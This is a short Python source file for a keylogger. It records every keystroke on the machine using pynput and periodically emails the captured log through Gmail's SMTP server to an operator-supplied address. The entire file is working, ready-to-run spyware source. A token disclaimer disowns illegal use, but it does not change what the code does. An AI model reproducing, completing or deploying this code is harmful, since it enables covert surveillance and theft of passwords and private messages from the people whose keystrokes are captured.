from pynput.keyboard import Listener
from threading import Timer
from datetime import datetime
from getpass import getpass

import smtplib

info = "Keylogger Python based with Gmail sending log architecture"

disclaimer = """Do not attempt to violate the law. 
If you planned to use the content for illegal purpose, 
i'm not be responsible of your actions."""

print("\n" + info + "\n\n" + disclaimer + "\n")

EMAIL_ADDRESS = input("Email Address: ")
while "@gmail.com" not in EMAIL_ADDRESS:
    print("Wrong Mail Format...\n")
    EMAIL_ADDRESS = input("Email Address: ")

EMAIL_PASSWD = getpass("\nEmail password: ")

flag = False
while flag is False:
    try:
        TIME = float(input("\nAverage sending mail time: "))
        flag = True
    except ValueError:
        print("Wrong format value...")
        flag = False

now = datetime.now()

msg = """ From: Keylogger Script
To: """ + EMAIL_ADDRESS + """
Subject: Keylogger Log Mail Content

""" + str(disclaimer).upper() + """

[ -- ] STARTING TIME: """ + str(now) + """

""" 

def on_press(key):
    global msg
    keystroke = str(key).replace("'", "")
    
    if keystroke == 'Key.enter': msg += " [ ENTER ] \n"
    elif keystroke == 'Key.backspace': msg = msg[:-1] 
    elif keystroke == 'Key.space': msg += ' '
    elif keystroke == 'Key.caps_lock': msg += ''
    elif "Key" in keystroke: msg += " [ "+ str(key).replace("Key.", "").upper() +" ] "
    else: msg += keystroke

def send():
    global msg
    if len(msg)>0: 
        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg)
        print("[ - ] " + str(datetime.now()) + ": Message Send!")
    Timer(TIME, send).start()
 
listener = Listener(on_press=on_press)
listener.start()
 
server=smtplib.SMTP('smtp.gmail.com',587)
server.starttls()

try: server.login(EMAIL_ADDRESS, EMAIL_PASSWD)
except smtplib.SMTPAuthenticationError: print("\nConnection REFUSED (Check credentials or the references)\n"), exit()
 
Timer(0.0, send).start()